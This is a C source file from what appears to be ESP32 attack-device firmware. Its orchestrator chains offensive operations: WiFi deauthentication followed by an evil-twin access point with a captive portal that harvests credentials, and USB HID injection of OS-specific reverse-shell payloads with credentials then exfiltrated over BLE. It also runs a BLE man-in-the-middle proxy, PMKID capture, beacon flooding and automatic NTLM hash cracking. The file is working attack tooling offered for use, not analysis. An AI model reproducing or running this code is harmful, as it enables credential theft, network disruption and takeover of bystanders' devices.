#include "attack_orchestrator.h"
#include "wifi_engine.h"
#include "ble_engine.h"
#include "usb_engine.h"
#include "camera_engine.h"
#include "web_dashboard.h"
#include "storage_manager.h"
#include "crack_engine.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "ORCH";

static volatile attack_chain_t s_active_chain = CHAIN_NONE;
static volatile bool s_running = false;
static TaskHandle_t s_chain_task = NULL;
static TaskHandle_t s_monitor_task = NULL;
static TaskHandle_t s_scheduler_task = NULL;

static volatile bool s_monitor_running = false;
static bool s_scheduled = false;
static uint32_t s_schedule_interval = 0;
static attack_chain_t s_schedule_chain = CHAIN_NONE;

static trigger_cfg_t s_triggers[8];
static int s_trigger_count = 0;

static uint32_t s_chains_executed = 0;
static uint32_t s_last_cred_count = 0;
static uint32_t s_last_hash_count = 0;

/* ── Chain A: WiFi Recon → Evil Twin ───────────── */

static void chain_wifi_recon_eviltwin(void)
{
    ESP_LOGI(TAG, "═══ Chain A: WiFi Recon → Evil Twin ═══");
    web_dashboard_broadcast("chain", "{\"name\":\"WiFi Recon → Evil Twin\",\"status\":\"started\"}");

    /* Step 1: Scan all networks */
    ESP_LOGI(TAG, "[1/6] Scanning networks...");
    wifi_engine_set_mode(WIFI_MODE_SCANNER);
    wifi_scan_start();

    viper_ap_t results[WIFI_MAX_SCAN_RESULTS];
    uint16_t count = WIFI_MAX_SCAN_RESULTS;
    wifi_scan_get_results(results, &count);

    if (count == 0) {
        ESP_LOGW(TAG, "No networks found, aborting chain");
        goto done;
    }

    /* Step 2: Select best target (highest RSSI with clients) */
    int best = 0;
    int best_rssi = -100;
    for (int i = 0; i < count; i++) {
        if (results[i].rssi > best_rssi && results[i].authmode != WIFI_AUTH_OPEN) {
            best_rssi = results[i].rssi;
            best = i;
        }
    }

    char bssid_str[18];
    wifi_mac_to_str(results[best].bssid, bssid_str);
    ESP_LOGI(TAG, "[2/6] Target: %s (%s, ch=%d, rssi=%d)",
             results[best].ssid, bssid_str, results[best].channel, results[best].rssi);

    /* Step 3: Deauth all clients on target AP */
    ESP_LOGI(TAG, "[3/6] Deauthing target AP...");
    wifi_engine_set_mode(WIFI_MODE_DEAUTH);
    wifi_deauth_start(results[best].bssid, NULL, results[best].channel, 100, 5000);

    /* Step 4: Spin up Evil Twin */
    ESP_LOGI(TAG, "[4/6] Starting Evil Twin: %s", results[best].ssid);
    wifi_engine_stop_current();

    evil_twin_cfg_t etc = {
        .authmode = WIFI_AUTH_OPEN,
        .channel = results[best].channel,
        .deauth_legit = true,
    };
    strncpy(etc.ssid, results[best].ssid, sizeof(etc.ssid) - 1);
    memcpy(etc.legit_bssid, results[best].bssid, 6);
    wifi_engine_set_mode(WIFI_MODE_EVIL_TWIN);
    wifi_eviltwin_start(&etc);

    /* Step 5: Serve captive portal (already started by evil twin) */
    ESP_LOGI(TAG, "[5/6] Captive portal active on 192.168.4.1");

    /* Step 6: Log credentials while running */
    ESP_LOGI(TAG, "[6/6] Listening for credentials (30s)...");
    for (int i = 0; i < 30; i++) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        uint8_t buf[8];
        size_t len;
        if (storage_read_file(FILE_CREDS, buf, sizeof(buf), &len) == ESP_OK) {
            ESP_LOGI(TAG, "Credential data logged (%d bytes)", len);
        }
    }

done:
    wifi_engine_stop_current();
    s_chains_executed++;
    web_dashboard_broadcast("chain", "{\"name\":\"WiFi Recon → Evil Twin\",\"status\":\"done\"}");
    ESP_LOGI(TAG, "═══ Chain A complete ═══");
}

/* ── Chain B: Plug & Pwn ────────────────────────── */

static void chain_plug_and_pwn(void)
{
    ESP_LOGI(TAG, "═══ Chain B: Plug & Pwn ═══");
    web_dashboard_broadcast("chain", "{\"name\":\"Plug & Pwn\",\"status\":\"started\"}");

    /* Step 1: Wait for USB connection */
    ESP_LOGI(TAG, "[1/5] Waiting for USB host...");
    int timeout = 15;
    while (timeout-- > 0 && !usb_engine_is_host_connected()) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    if (!usb_engine_is_host_connected()) {
        ESP_LOGW(TAG, "USB host not detected, aborting");
        goto done;
    }

    /* Step 2: Wait for driver load */
    ESP_LOGI(TAG, "[2/5] USB connected, waiting for driver load...");
    vTaskDelay(pdMS_TO_TICKS(3000));

    /* Step 3: Detect OS */
    ESP_LOGI(TAG, "[3/5] Fingerprinting OS...");
    os_type_t os = usb_os_fingerprint();
    const char *os_name = "Unknown";
    switch (os) {
        case OS_WINDOWS: os_name = "Windows"; break;
        case OS_MACOS:   os_name = "macOS"; break;
        case OS_LINUX:   os_name = "Linux"; break;
        default: break;
    }
    ESP_LOGI(TAG, "Detected OS: %s", os_name);
    web_dashboard_broadcast("os_detected", os_name);

    /* Step 4: Select and inject payload */
    ESP_LOGI(TAG, "[4/5] Injecting payload for %s...", os_name);
    const char *payload_path = NULL;

    switch (os) {
        case OS_WINDOWS:
            payload_path = DIR_PAYLOADS "/win_reverse_shell.txt";
            break;
        case OS_MACOS:
            payload_path = DIR_PAYLOADS "/mac_reverse_shell.txt";
            break;
        case OS_LINUX:
            payload_path = DIR_PAYLOADS "/linux_reverse_shell.txt";
            break;
        default:
            payload_path = DIR_PAYLOADS "/generic_info.txt";
            break;
    }

    if (storage_file_exists(payload_path) == ESP_OK) {
        usb_ducky_execute(payload_path);
    } else {
        ESP_LOGW(TAG, "Payload not found: %s", payload_path);
        usb_hid_send_string("[VIPER-S3] No payload found for ");
        usb_hid_send_string(os_name);
        usb_hid_send_key_with_mods(USB_HID_KEY_ENTER, 0);
    }

    /* Step 5: Exfil via BLE */
    ESP_LOGI(TAG, "[5/5] Attempting BLE exfiltration...");
    if (ble_uart_is_connected()) {
        uint8_t buf[512];
        size_t len;
        if (storage_read_file(FILE_CREDS, buf, sizeof(buf) - 1, &len) == ESP_OK) {
            buf[len] = '\0';
            ble_uart_send((uint8_t *)"=== CREDENTIALS ===\n", 20);
            ble_uart_send(buf, len);
        }
    }

    s_chains_executed++;
done:
    web_dashboard_broadcast("chain", "{\"name\":\"Plug & Pwn\",\"status\":\"done\"}");
    ESP_LOGI(TAG, "═══ Chain B complete ═══");
}

/* ── Chain C: Conference Recon ──────────────────── */

static void chain_conference_recon(void)
{
    ESP_LOGI(TAG, "═══ Chain C: Conference Recon ═══");
    web_dashboard_broadcast("chain", "{\"name\":\"Conference Recon\",\"status\":\"started\"}");

    /* Step 1: BLE scan all devices */
    ESP_LOGI(TAG, "[1/4] BLE scanning for devices...");
    ble_scanner_clear();
    ble_scanner_start(5000);
    vTaskDelay(pdMS_TO_TICKS(6000));

    int ble_count = ble_scanner_get_count();
    ESP_LOGI(TAG, "BLE devices found: %d", ble_count);

    ble_device_t *ble_devs = malloc(ble_count * sizeof(ble_device_t));
    if (ble_devs) {
        ble_scanner_get_results(ble_devs, ble_count);
        for (int i = 0; i < ble_count; i++) {
            ESP_LOGI(TAG, "  BLE[%d] %s rssi=%d type=%s",
                     i, ble_devs[i].name[0] ? ble_devs[i].name : "(unnamed)",
                     ble_devs[i].rssi, ble_devs[i].device_type);
        }
        free(ble_devs);
    }

    /* Step 2: WiFi scan */
    ESP_LOGI(TAG, "[2/4] WiFi scanning...");
    wifi_engine_set_mode(WIFI_MODE_SCANNER);
    wifi_scan_start();

    viper_ap_t aps[WIFI_MAX_SCAN_RESULTS];
    uint16_t ap_count = WIFI_MAX_SCAN_RESULTS;
    wifi_scan_get_results(aps, &ap_count);
    ESP_LOGI(TAG, "WiFi networks found: %d", ap_count);

    /* Step 3: Start beacon flood (chaos mode) */
    ESP_LOGI(TAG, "[3/4] Beacon flood engaged...");
    const char *funny_ssids[] = {
        "DEF CON Badge", "Free WiFi", "FBI Surveillance", "Not Malicious",
        "SSID That Launched 1000 Ships", "Pretty Fly For A WiFi",
        "TellMyWiFiLoveHer", "Silicon Valley - HQ",
        "Vendor Booth #42", "CTF Flag Here", NULL
    };

    wifi_engine_set_mode(WIFI_MODE_BEACON_FLOOD);
    wifi_beacon_flood_start(funny_ssids, 10, 6, 500);
    vTaskDelay(pdMS_TO_TICKS(3000));
    wifi_beacon_flood_stop();

    /* Step 4: Export report */
    ESP_LOGI(TAG, "[4/4] Exporting intelligence report...");

    char report[1024];
    int off = snprintf(report, sizeof(report),
        "=== CONFERENCE RECON REPORT ===\n"
        "BLE Devices: %d\nWiFi Networks: %d\n",
        ble_count, ap_count);
    off += snprintf(report + off, sizeof(report) - off, "---\n");
    storage_write_file("/viper/captures/recon_report.txt",
                       (uint8_t *)report, off, false);

    snprintf(report, sizeof(report), "{\"ble\":%d,\"wifi\":%d}", ble_count, ap_count);
    web_dashboard_broadcast("recon_report", report);

    s_chains_executed++;
    web_dashboard_broadcast("chain", "{\"name\":\"Conference Recon\",\"status\":\"done\"}");
    ESP_LOGI(TAG, "═══ Chain C complete ═══");
}

/* ── Chain D: BLE MITM Proxy ────────────────────── */

static void chain_ble_mitm(void)
{
    ESP_LOGI(TAG, "═══ Chain D: BLE MITM Proxy ═══");
    web_dashboard_broadcast("chain", "{\"name\":\"BLE MITM\",\"status\":\"started\"}");

    ESP_LOGI(TAG, "[1/3] Scanning for BLE devices...");
    ble_scanner_clear();
    ble_scanner_start(5000);
    vTaskDelay(pdMS_TO_TICKS(6000));

    int count = ble_scanner_get_count();
    if (count == 0) {
        ESP_LOGW(TAG, "No BLE devices found, aborting");
        goto done;
    }

    ble_device_t *devs = malloc(count * sizeof(ble_device_t));
    if (!devs) goto done;
    ble_scanner_get_results(devs, count);

    int best_idx = -1;
    int best_rssi = -100;
    for (int i = 0; i < count; i++) {
        ESP_LOGI(TAG, "  BLE[%d]: %s rssi=%d type=%s", i,
                 devs[i].name[0] ? devs[i].name : "(unnamed)",
                 devs[i].rssi, devs[i].device_type);

        if (devs[i].rssi > best_rssi && devs[i].manufacturer != 0) {
            best_rssi = devs[i].rssi;
            best_idx = i;
        }
    }

    if (best_idx < 0) {
        ESP_LOGW(TAG, "No suitable BLE target found");
        free(devs);
        goto done;
    }

    ESP_LOGI(TAG, "[2/3] Starting MITM proxy against: %s",
             devs[best_idx].name[0] ? devs[best_idx].name : devs[best_idx].device_type);
    char chain_msg[128];
    snprintf(chain_msg, sizeof(chain_msg),
        "{\"name\":\"BLE MITM\",\"status\":\"connecting\",\"target\":\"%s\"}",
        devs[best_idx].name);
    web_dashboard_broadcast("chain", chain_msg);

    esp_err_t ret = ble_mitm_start(devs[best_idx].addr,
                                    devs[best_idx].name[0] ? devs[best_idx].name : NULL,
                                    3000);
    free(devs);

    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "BLE MITM start failed");
        goto done;
    }

    ESP_LOGI(TAG, "[3/3] MITM proxy active (30s)...");
    for (int i = 0; i < 30; i++) {
        ble_mitm_status_t st = ble_mitm_get_status();
        if (!st.active) break;

        if (st.peripheral_connected) {
            ESP_LOGI(TAG, "  Client connected to proxy! Forwarding GATT...");
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    ble_mitm_stop();

done:
    s_chains_executed++;
    web_dashboard_broadcast("chain", "{\"name\":\"BLE MITM\",\"status\":\"done\"}");
    ESP_LOGI(TAG, "═══ Chain D complete ═══");
}

/* ── Chain E: AUTO-PWNER — Full autonomous attack chain ───────────── */
/* DEF CON showstopper: scan → PMKID harvest → deauth → evil twin (hotel portal)
   → capture creds → auto-crack in background → live WebSocket alerts      */

static void auto_crack_task(void *arg)
{
    char *hash_line = (char *)arg;
    if (!hash_line) vTaskDelete(NULL);

    /* Quick sanity: expect 32-hex NTLM hash */
    if (strlen(hash_line) >= 32) {
        crack_result_t result;
        esp_err_t ret = crack_engine_crack(hash_line, HASH_TYPE_NTLM,
                                           FILE_WORDLIST_10K, &result);
        if (ret == ESP_OK && result.found) {
            char evt[256];
            snprintf(evt, sizeof(evt),
                "{\"hash\":\"%s\",\"password\":\"%s\",\"attempts\":%lu,\"ms\":%lu}",
                hash_line, result.password,
                (unsigned long)result.attempts,
                (unsigned long)result.duration_ms);
            web_dashboard_broadcast("cracked", evt);
            ESP_LOGI("AUTO", "\U0001f513 CRACKED: %s = '%s' (%lu ms)",
                     hash_line, result.password, (unsigned long)result.duration_ms);
        } else {
            /* Try bigger wordlist */
            ret = crack_engine_crack(hash_line, HASH_TYPE_NTLM,
                                     FILE_WORDLIST_100K, &result);
            if (ret == ESP_OK && result.found) {
                char evt[256];
                snprintf(evt, sizeof(evt),
                    "{\"hash\":\"%s\",\"password\":\"%s\",\"attempts\":%lu,\"ms\":%lu}",
                    hash_line, result.password,
                    (unsigned long)result.attempts,
                    (unsigned long)result.duration_ms);
                web_dashboard_broadcast("cracked", evt);
            } else {
                char evt[128];
                snprintf(evt, sizeof(evt),
                    "{\"hash\":\"%s\",\"found\":false}", hash_line);
                web_dashboard_broadcast("crack_failed", evt);
            }
        }
    }
    free(hash_line);
    vTaskDelete(NULL);
}

static void chain_auto_pwner(void)
{
    ESP_LOGI(TAG, "\u2588\u2588\u2588 Chain E: AUTO-PWNER \u2588\u2588\u2588");
    web_dashboard_broadcast("chain",
        "{\"name\":\"AUTO-PWNER\",\"status\":\"started\","
        "\"steps\":[\"scan\",\"pmkid\",\"deauth\",\"evil_twin\",\"capture\",\"crack\"]}");

    /* ── Step 1: Scan ── */
    ESP_LOGI(TAG, "[1/7] Scanning WiFi environment...");
    web_dashboard_broadcast("autopwn", "{\"step\":\"scan\",\"status\":\"active\"}");
    wifi_engine_set_mode(WIFI_MODE_SCANNER);
    wifi_scan_start();
    vTaskDelay(pdMS_TO_TICKS(8000));  /* 8s scan for thorough results */

    viper_ap_t results[WIFI_MAX_SCAN_RESULTS];
    uint16_t count = WIFI_MAX_SCAN_RESULTS;
    wifi_scan_get_results(results, &count);

    if (count == 0) {
        ESP_LOGW(TAG, "AUTO-PWNER: No networks found");
        web_dashboard_broadcast("autopwn", "{\"step\":\"scan\",\"status\":\"failed\",\"reason\":\"no_networks\"}");
        goto done;
    }

    /* Broadcast scan results */
    char scan_evt[256];
    snprintf(scan_evt, sizeof(scan_evt),
        "{\"step\":\"scan\",\"status\":\"done\",\"found\":%d}", count);
    web_dashboard_broadcast("autopwn", scan_evt);

    /* ── Step 2: Pick best target (highest RSSI, non-open) ── */
    int best = -1;
    int best_rssi = -100;
    for (int i = 0; i < count; i++) {
        if (results[i].rssi > best_rssi && results[i].authmode != WIFI_AUTH_OPEN) {
            best_rssi = results[i].rssi;
            best = i;
        }
    }
    if (best < 0) best = 0;  /* Fallback: pick strongest regardless */

    char target_evt[256];
    char bssid_str[18];
    wifi_mac_to_str(results[best].bssid, bssid_str);
    snprintf(target_evt, sizeof(target_evt),
        "{\"step\":\"target\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"rssi\":%d}",
        results[best].ssid, bssid_str,
        results[best].channel, results[best].rssi);
    web_dashboard_broadcast("autopwn", target_evt);
    ESP_LOGI(TAG, "[2/7] Target: '%s' (%s) ch=%d rssi=%d",
             results[best].ssid, bssid_str,
             results[best].channel, results[best].rssi);

    /* ── Step 3: PMKID harvest (10s) ── */
    ESP_LOGI(TAG, "[3/7] PMKID harvest (10s)...");
    web_dashboard_broadcast("autopwn", "{\"step\":\"pmkid\",\"status\":\"active\"}");
    wifi_engine_set_mode(WIFI_MODE_PMKID_HARVEST);
    wifi_pmkid_harvest_start(results[best].bssid);
    vTaskDelay(pdMS_TO_TICKS(10000));
    wifi_pmkid_harvest_stop();
    web_dashboard_broadcast("autopwn", "{\"step\":\"pmkid\",\"status\":\"done\"}");

    /* ── Step 4: Deauth clients off target AP ── */
    ESP_LOGI(TAG, "[4/7] Deauthing clients from '%s'...", results[best].ssid);
    web_dashboard_broadcast("autopwn", "{\"step\":\"deauth\",\"status\":\"active\"}");
    wifi_engine_set_mode(WIFI_MODE_DEAUTH);
    wifi_deauth_start(results[best].bssid, NULL, results[best].channel, 50, 6000);
    vTaskDelay(pdMS_TO_TICKS(6000));
    wifi_engine_stop_current();
    web_dashboard_broadcast("autopwn", "{\"step\":\"deauth\",\"status\":\"done\"}");

    /* ── Step 5: Evil Twin with hotel portal ── */
    ESP_LOGI(TAG, "[5/7] Evil Twin: '%s' with hotel portal", results[best].ssid);
    web_dashboard_broadcast("autopwn",
        "{\"step\":\"evil_twin\",\"status\":\"active\",\"portal\":\"hotel\"}");

    evil_twin_cfg_t etc = {
        .authmode = WIFI_AUTH_OPEN,   /* Open so victims can always connect */
        .channel  = results[best].channel,
        .deauth_legit = true,
    };
    strncpy(etc.ssid, results[best].ssid, sizeof(etc.ssid) - 1);
    memcpy(etc.legit_bssid, results[best].bssid, 6);
    wifi_engine_set_mode(WIFI_MODE_EVIL_TWIN);
    wifi_eviltwin_start(&etc);

    /* Start captive portal with hotel template */
    captive_portal_start("hotel");

    /* ── Step 6: Harvest credentials (45s) ── */
    ESP_LOGI(TAG, "[6/7] Harvesting credentials (45s)...");
    web_dashboard_broadcast("autopwn", "{\"step\":\"harvest\",\"status\":\"active\"}");

    size_t last_cred_size = 0;
    {
        FILE *f = fopen(FILE_CREDS, "rb");
        if (f) { fseek(f, 0, SEEK_END); last_cred_size = ftell(f); fclose(f); }
    }

    uint8_t clients_seen = 0;
    for (int s = 0; s < 45; s++) {
        vTaskDelay(pdMS_TO_TICKS(1000));

        /* Check if new client connected */
        uint8_t c = wifi_eviltwin_get_client_count();
        if (c > clients_seen) {
            clients_seen = c;
            char cc_evt[64];
            snprintf(cc_evt, sizeof(cc_evt), "{\"step\":\"client\",\"count\":%d}", c);
            web_dashboard_broadcast("autopwn", cc_evt);
            ESP_LOGI(TAG, "  Client #%d connected to Evil Twin!", c);
        }

        /* Check for new credentials */
        size_t new_size = 0;
        FILE *f = fopen(FILE_CREDS, "rb");
        if (f) { fseek(f, 0, SEEK_END); new_size = ftell(f); fclose(f); }

        if (new_size > last_cred_size) {
            last_cred_size = new_size;
            web_dashboard_broadcast("autopwn",
                "{\"step\":\"credential\",\"status\":\"captured\"}");
            ESP_LOGI(TAG, "  \u2705 NEW CREDENTIAL CAPTURED!");
        }
    }

    wifi_engine_stop_current();
    captive_portal_stop();
    web_dashboard_broadcast("autopwn", "{\"step\":\"harvest\",\"status\":\"done\"}");

    /* ── Step 7: Auto-crack hashes ── */
    ESP_LOGI(TAG, "[7/7] Auto-cracking captured hashes...");
    web_dashboard_broadcast("autopwn", "{\"step\":\"crack\",\"status\":\"active\"}");
    {
        char hash_buf[4096];
        size_t hlen = 0;
        if (storage_read_file(FILE_HASHES, (uint8_t *)hash_buf, sizeof(hash_buf) - 1, &hlen) == ESP_OK && hlen > 0) {
            hash_buf[hlen] = '\0';
            /* Spawn a background crack task for the first hash line */
            char *nl = strchr(hash_buf, '\n');
            if (nl) *nl = '\0';
            /* Extract hash value from JSONL: {"hash":"XXXXXX"} */
            char *hv = strstr(hash_buf, "\"hash\":\"");
            if (hv) {
                hv += 8;
                char *he = strchr(hv, '"');
                if (he) {
                    *he = '\0';
                    char *hash_copy = strdup(hv);
                    if (hash_copy) {
                        xTaskCreate(auto_crack_task, "autocrack", 8192, hash_copy, 2, NULL);
                    }
                }
            }
        }
    }

done:
    s_chains_executed++;
    web_dashboard_broadcast("chain",
        "{\"name\":\"AUTO-PWNER\",\"status\":\"done\"}");
    ESP_LOGI(TAG, "\u2588\u2588\u2588 Chain E: AUTO-PWNER complete \u2588\u2588\u2588");
}

/* ── Chain execution ────────────────────────────── */

static void chain_task(void *arg)
{
    attack_chain_t chain = (attack_chain_t)(intptr_t)arg;
    s_active_chain = chain;

    switch (chain) {
        case CHAIN_WIFI_RECON_EVIL_TWIN: chain_wifi_recon_eviltwin(); break;
        case CHAIN_PLUG_AND_PWN:         chain_plug_and_pwn(); break;
        case CHAIN_CONFERENCE_RECON:     chain_conference_recon(); break;
        case CHAIN_BLE_MITM:             chain_ble_mitm(); break;
        case CHAIN_AUTO_PWNER:           chain_auto_pwner(); break;
        default: break;
    }

    s_active_chain = CHAIN_NONE;
    s_chain_task = NULL;
    vTaskDelete(NULL);
}

/* ── Monitor task ───────────────────────────────── */

static void health_log(void)
{
    system_health_t h;
    attack_orchestrator_get_health(&h);

    ESP_LOGI(TAG, "Health: heap=%luKB/%luKB wifi=%lu ble=%d cam=%d usb=%d chains=%lu",
             h.heap_free, h.heap_min, h.wifi_mode, h.ble_active,
             h.camera_active, h.usb_active, h.chains_executed);

    /* Broadcast health via websocket */
    char buf[256];
    snprintf(buf, sizeof(buf),
        "{\"heap\":%lu,\"wifi_mode\":%lu,\"ble\":%d,\"cam\":%d,\"usb\":%d,\"chains\":%lu}",
        h.heap_free, h.wifi_mode, h.ble_active, h.camera_active,
        h.usb_active, h.chains_executed);
    web_dashboard_broadcast("health", buf);
}

static void check_credential_triggers(void)
{
    size_t cred_size = 0;
    {
        FILE *f = fopen(FILE_CREDS, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            cred_size = ftell(f);
            fclose(f);
        }
    }
    if (cred_size > s_last_cred_count) {
        web_dashboard_broadcast("new_credential", "{}");
        s_last_cred_count = cred_size;
    }

    size_t hash_size = 0;
    {
        FILE *f = fopen(FILE_HASHES, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            hash_size = ftell(f);
            fclose(f);
        }
    }
    if (hash_size > s_last_hash_count) {
        web_dashboard_broadcast("new_hash", "{}");
        s_last_hash_count = hash_size;
    }
}

static void check_motion_trigger(void)
{
    if (camera_engine_is_initialized() && camera_engine_motion_detected()) {
        ESP_LOGI(TAG, "Motion triggered!");
        char motion_msg[64];
        snprintf(motion_msg, sizeof(motion_msg), "{\"value\":%d}", camera_engine_get_motion_value());
        web_dashboard_broadcast("motion", motion_msg);

        camera_engine_save_jpeg(DIR_CAPTURES_IMG "/motion.jpg");

        for (int i = 0; i < s_trigger_count; i++) {
            if (s_triggers[i].type == TRIGGER_MOTION && s_triggers[i].enabled) {
                if (s_triggers[i].action) s_triggers[i].action(s_triggers[i].arg);
            }
        }
    }
}

static void monitor_task(void *arg)
{
    int tick = 0;

    while (s_monitor_running) {
        tick++;

        if (tick % 5 == 0) {
            health_log();
        }

        check_credential_triggers();

        if (camera_engine_is_initialized() && tick % 2 == 0) {
            check_motion_trigger();
        }

        if (tick % 10 == 0 && s_scheduled && s_schedule_interval > 0) {
            attack_orchestrator_run_chain(s_schedule_chain);
        }

        attack_orchestrator_check_triggers();

        ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(1000));
    }

    s_monitor_task = NULL;
    vTaskDelete(NULL);
}

/* ── Public API ─────────────────────────────────── */

esp_err_t attack_orchestrator_start(void)
{
    if (s_running) return ESP_OK;
    s_running = true;

    s_monitor_running = true;
    xTaskCreatePinnedToCore(monitor_task, "orchestrator", 4096, NULL, 3,
                            &s_monitor_task, 1);

    ESP_LOGI(TAG, "Attack orchestrator started");
    web_dashboard_broadcast("orchestrator", "{\"status\":\"online\"}");
    return ESP_OK;
}

esp_err_t attack_orchestrator_stop(void)
{
    s_running = false;
    s_monitor_running = false;
    attack_orchestrator_stop_chain();
    if (s_monitor_task) {
        xTaskNotifyGive(s_monitor_task);
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    s_monitor_task = NULL;
    ESP_LOGI(TAG, "Attack orchestrator stopped");
    return ESP_OK;
}

esp_err_t attack_orchestrator_run_chain(attack_chain_t chain)
{
    if (s_chain_task) {
        ESP_LOGW(TAG, "Chain already running, stopping first");
        attack_orchestrator_stop_chain();
    }

    s_active_chain = chain;
    xTaskCreatePinnedToCore(chain_task, "chain_exec", 8192,
                            (void *)(intptr_t)chain, 5, &s_chain_task, 1);
    return ESP_OK;
}

esp_err_t attack_orchestrator_stop_chain(void)
{
    s_active_chain = CHAIN_NONE;
    if (s_chain_task) {
        vTaskDelay(pdMS_TO_TICKS(100));
        if (s_chain_task) {
            vTaskDelete(s_chain_task);
            s_chain_task = NULL;
        }
    }
    wifi_engine_stop_current();
    return ESP_OK;
}

attack_chain_t attack_orchestrator_get_active_chain(void) { return s_active_chain; }
bool attack_orchestrator_is_busy(void) { return s_active_chain != CHAIN_NONE; }

/* ── Trigger system ─────────────────────────────── */

esp_err_t attack_orchestrator_register_trigger(const trigger_cfg_t *cfg)
{
    if (s_trigger_count >= 8) return ESP_ERR_NO_MEM;
    memcpy(&s_triggers[s_trigger_count++], cfg, sizeof(trigger_cfg_t));
    ESP_LOGI(TAG, "Trigger registered: type=%d", cfg->type);
    return ESP_OK;
}

esp_err_t attack_orchestrator_unregister_trigger(trigger_type_t type)
{
    for (int i = 0; i < s_trigger_count; i++) {
        if (s_triggers[i].type == type) {
            s_triggers[i].enabled = false;
            return ESP_OK;
        }
    }
    return ESP_ERR_NOT_FOUND;
}

void attack_orchestrator_check_triggers(void)
{
    for (int i = 0; i < s_trigger_count; i++) {
        if (!s_triggers[i].enabled) continue;

        switch (s_triggers[i].type) {
            case TRIGGER_NEW_CLIENT: {
                uint8_t count = wifi_eviltwin_get_client_count();
                static uint8_t last_count = 0;
                if (count > last_count) {
                    if (s_triggers[i].action) s_triggers[i].action(s_triggers[i].arg);
                    char cc_msg[64];
                    snprintf(cc_msg, sizeof(cc_msg), "{\"count\":%d}", count);
                    web_dashboard_broadcast("client_connected", cc_msg);
                }
                last_count = count;
                break;
            }
            case TRIGGER_BLE_DEVICE_SEEN: {
                int ble_count = ble_scanner_get_count();
                static int last_ble_count = 0;
                if (ble_count > last_ble_count) {
                    last_ble_count = ble_count;
                    ble_device_t devs[BLE_MAX_DEVICES];
                    int c = ble_scanner_get_results(devs, BLE_MAX_DEVICES);
                    if (c > 0 && s_triggers[i].arg && s_triggers[i].action) {
                        uint8_t *target = (uint8_t *)s_triggers[i].arg;
                        for (int b = 0; b < c; b++) {
                            if (memcmp(devs[b].addr, target, 6) == 0) {
                                s_triggers[i].action(s_triggers[i].arg);
                                char ble_msg[128];
                                snprintf(ble_msg, sizeof(ble_msg),
                                    "{\"name\":\"%s\",\"rssi\":%d}",
                                    devs[b].name, devs[b].rssi);
                                web_dashboard_broadcast("ble_device_seen", ble_msg);
                            }
                        }
                    }
                }
                break;
            }
            default:
                break;
        }
    }
}

/* ── Scheduler ──────────────────────────────────── */

esp_err_t attack_orchestrator_schedule(uint32_t interval_ms, attack_chain_t chain)
{
    s_scheduled = true;
    s_schedule_interval = interval_ms;
    s_schedule_chain = chain;
    ESP_LOGI(TAG, "Scheduled chain %d every %lu ms", chain, interval_ms);
    return ESP_OK;
}

esp_err_t attack_orchestrator_unschedule(void)
{
    s_scheduled = false;
    return ESP_OK;
}

/* ── Health ─────────────────────────────────────── */

void attack_orchestrator_get_health(system_health_t *health)
{
    if (!health) return;
    memset(health, 0, sizeof(*health));
    health->uptime_ms = esp_timer_get_time() / 1000;
    health->heap_free = esp_get_free_heap_size() / 1024;
    health->heap_min = esp_get_minimum_free_heap_size() / 1024;
    health->wifi_mode = (uint32_t)wifi_engine_get_mode();
    health->ble_active = ble_uart_is_connected();
    health->camera_active = camera_engine_is_initialized();
    health->usb_active = usb_engine_is_host_connected();
    health->chains_executed = s_chains_executed;
}
